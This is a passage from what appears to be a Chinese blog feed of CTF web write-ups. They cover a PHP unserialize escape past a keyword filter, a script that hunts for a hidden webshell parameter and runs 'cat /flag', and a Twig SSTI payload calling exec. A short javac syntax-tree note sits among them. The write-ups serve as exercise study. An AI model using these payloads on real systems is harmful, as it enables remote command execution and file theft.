class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>很好，其实其中很明确是要用反序列化；</p><p>比如说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$img</span>[<span class="hljs-string">&#x27;one&#x27;</span>] = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-variable">$img</span>[<span class="hljs-string">&#x27;two&#x27;</span>] = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$img</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;</span><br><span class="hljs-comment">// string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>继续看代码，有个过滤函数<code>filter</code>过滤了一些字符，将黑名单中的字符替换为空；之后是对<code>$_SESSION</code>的操作，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure><p>这里就是以POST请求发送<code>_SESSION</code>数据；</p><blockquote><p>extract()函数从数组中将变量导入到当前的符号表。</p></blockquote><p>之后的GET请求，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>根据<code>img_path</code>的值对<code>$_SESSION[&#39;img&#39;]</code>赋值；</p><p>最后将<code>$_SESSION</code>序列化后进行过滤，然后反序列化、base64解码、读文件。</p><p>在<code>phpinfo</code>中发现了目标文件，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230108184327310.png" alt="image-20230108184327310"></p><p>反序列化有两种：</p><ul><li>键值逃逸</li><li>键名逃逸</li></ul><p>首先看键名逃逸，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>其中<code>ZDBnM19mMWFnLnBocA==</code>是<code>d0g3_f1ag.php</code>的base64编码，将这个放入代码会怎么执行，首先要知道这样设置<code>$_SESSION</code>中有两个键：<code>phpflag</code>和<code>img</code>，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$test</span>[phpflag] = <span class="hljs-string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><br><span class="hljs-variable">$a1</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$a2</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a1</span>);<br><span class="hljs-variable">$a3</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a2</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a3</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>可以看到过滤后即<code>$a2</code>被分为了两部分：</p><ul><li>键：<code>&quot;;s:48:</code><br>值：<code>1</code></li><li>键：<code>img</code><br>值：<code>ZDBnM19mMWFnLnBocA==</code></li></ul><p>后面的部分呢？被丢弃了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#正规序列化的字符串</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">#带有多余的字符的字符串</span><br><span class="hljs-variable">$a_laji</span> = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a_laji</span>));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array(2) &#123;</span><br><span class="hljs-comment">  [&quot;one&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;flag&quot;</span><br><span class="hljs-comment">  [&quot;two&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;test&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">array(2) &#123;</span><br><span class="hljs-comment">  [&quot;one&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;flag&quot;</span><br><span class="hljs-comment">  [&quot;two&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;test&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>执行之后再网页源码中得到flag文件，将其编码后再次读取得到flag；</p><hr><p>键值逃逸使用的payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[user]=flagflagflagflagflagphp&amp;_SESSION[function]=<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">2</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这个执行之后的结果是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$test</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&quot;flagflagflagflagflagphp&quot;</span>;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&quot;function&quot;</span>] = <span class="hljs-string">&quot;\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;s:1:\&quot;1\&quot;;s:1:\&quot;2\&quot;;&#125;&quot;</span>;<br><br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><br><span class="hljs-variable">$a1</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$a2</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a1</span>);<br><span class="hljs-variable">$a3</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a2</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a3</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:57:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">a:3:&#123;s:4:&quot;user&quot;;s:23:&quot;&quot;;s:8:&quot;function&quot;;s:57:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>再<code>$a2</code>中有三个键值对：</p><ul><li>键：<code>user</code><br>值：<code>&quot;;s:8:&quot;function&quot;;s:57:&quot;</code></li><li>键：<code>img</code><br>值：<code>ZDBnM19mMWFnLnBocA==</code></li><li>键：<code>1</code><br>值：<code>2</code></li></ul><p>后面的忽略掉；之后过程相同。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 强网杯2019-高明的黑客</title>
    <link href="/2023/01/05/%5Bctf-web%5D%20%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <url>/2023/01/05/%5Bctf-web%5D%20%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>进入后，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230105210845286.png" alt="image-20230105210845286"></p><p>很明显，访问该地址，下载文件，然后发现网站有3002个文件，既然说明了网站已经被黑了，可能存在木马，就用脚本搜索，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br> <br> <br>files = os.listdir(<span class="hljs-string">r&#x27;.\www.tar\www\src&#x27;</span>)    <span class="hljs-comment">#获取路径下的所有文件</span><br>reg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)   <span class="hljs-comment">#设置正则</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:                <span class="hljs-comment">#从第一个文件开始</span><br>    url = <span class="hljs-string">&quot;http://167b0363-a39f-4927-bb25-a24076b71f0b.node4.buuoj.cn:81/&quot;</span> + i<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./www.tar/www/src/&quot;</span>+i)        <span class="hljs-comment">#打开这个文件</span><br>    data = f.read()           <span class="hljs-comment">#读取文件内容</span><br>    f.close()                 <span class="hljs-comment">#关闭文件</span><br>    result = reg.findall(data)  <span class="hljs-comment">#从文件中找到GET请求</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> result:           <span class="hljs-comment">#从第一个GET参数开始</span><br>        payload = url + <span class="hljs-string">&quot;?&quot;</span> + j + <span class="hljs-string">&quot;=echo ******&quot;</span>   <span class="hljs-comment">##尝试请求次路径，并执行命令</span><br>        <span class="hljs-comment">#print(payload)</span><br>        html = requests.get(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;******&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            <span class="hljs-built_in">print</span>(payload)<br>            exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>要跑很久的，最后就是找到，</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://<span class="hljs-number">167b0363</span>-a39f-<span class="hljs-number">4927</span>-bb25-a24076b71f0b.node4.buuoj.cn:<span class="hljs-number">81</span>/xk0SzyKwfzw.php?Efa5BVG=cat%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure><blockquote><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/115256974">强网杯 2019]高明的黑客_Sk1y的博客-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BJDCTF2020-CookieIsSoStable</title>
    <link href="/2023/01/04/%5Bctf-web%5D%20BJDCTF2020-CookieIsSoStable/"/>
    <url>/2023/01/04/%5Bctf-web%5D%20BJDCTF2020-CookieIsSoStable/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><blockquote><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n’s Blog</a></p></blockquote><p>进入后界面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200250294.png" alt="image-20230104200250294"></p><p>主要有两个连接，</p><p>首先进入flag，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200409699.png" alt="image-20230104200409699"></p><p>随便输入一个id，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200426551.png" alt="image-20230104200426551"></p><p>尝试SQL注入，但是好像没有反应，就是打印了字符串，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200501595.png" alt="image-20230104200501595"></p><p>看一下提示，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200540342.png" alt="image-20230104200540342"></p><p>应该和cookie有关，bp抓包，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200736690.png" alt="image-20230104200736690"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104200746500.png" alt="image-20230104200746500"></p><p>这两个包一个是POST请求，一个是GET请求，但是结果是不同的，POST请求是无效的，在网上找了很多都没有说明这一点。</p><p>这里用到的是SSTI，即服务器模板注入，php常见的就是twig，测试，使用<code>&#123;&#123;2*3&#125;&#125;</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104201031622.png" alt="image-20230104201031622"></p><p>使用的payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看id</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看flag</span><br></code></pre></td></tr></table></figure><p>不过还有个问题，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104201147527.png" alt="image-20230104201147527"></p><p>只能显示一个，这样做，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230104201920319.png" alt="image-20230104201920319"></p><p>最后得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] java抽象语法树</title>
    <link href="/2023/01/03/%5Bjava%5D%20java%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/"/>
    <url>/2023/01/03/%5Bjava%5D%20java%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="java抽象语法树"><a href="#java抽象语法树" class="headerlink" title="java抽象语法树"></a>java抽象语法树</h1><p>javac的编译过程：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/990532-20161001120048031-1401084032.png" alt="img"></p><p>流程：</p><ul><li>词法分析：将源码转换为Token流；<br>将源代码划分为一个个Token（找出java语言中的if，else，for等关键字）；</li><li>语法分析：将Token流转换为语法树；<br>将上一步的Token组成一句句话（或者一句句代码），检查是否符合java语言规范；</li><li>语义分析器：将语法树转化为注解语法树；<br>将复杂的语法转化成简单的语法（比如注解，比如foreach转化为for循环，比如去掉不用的代码块），并做一些检查，添加一些代码（比如默认构造器）；</li><li>代码生成器：将注解语法树转化为字节码；</li></ul>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>抽象语法树</tag>
      
      <tag>java编译</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] WUSTCTF2020-朴实无华</title>
    <link href="/2023/01/03/%5Bctf-web%5D%20WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"/>
    <url>/2023/01/03/%5Bctf-web%5D%20WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>进入页面直接出错，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230103192829714.png" alt="image-20230103192829714"></p><p>关键词<code>header</code>，抓包看看，首先转到了<code>robots.txt</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230103192918859.png" alt="image-20230103192918859"></p><p>有个文件，访问试试，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230103192948782.png" alt="image-20230103192948782"></p><p>试了一下，果然不是，然后这个文件抓包试试，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230103193028809.png" alt="image-20230103193028809"></p><p>发现文件<code>fl4g.php</code>，访问，得到php代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       